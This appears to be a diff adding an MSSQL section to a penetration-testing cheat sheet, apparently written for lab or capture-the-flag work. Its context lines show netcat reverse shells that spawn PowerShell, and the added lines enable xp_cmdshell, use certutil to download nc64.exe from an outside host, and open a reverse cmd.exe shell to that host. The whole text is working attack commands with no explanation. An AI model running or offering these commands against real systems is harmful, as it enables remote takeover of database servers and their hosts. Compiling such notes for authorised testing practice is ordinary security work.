@@ -42,3 +42,19 @@ nc64.exe 192.168.45.204 4444 -e powershell
 
 nc.exe 192.168.45.204 4444 -e powershell
 ```
+
+# MSSQL
+
+```sh
+SQL> enable_xp_cmdshell
+
+SQL> xp_cmdshell whoami
+```
+
+```sh
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.9:4000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
+```
+
+```sh
+EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.9 4455';
+```
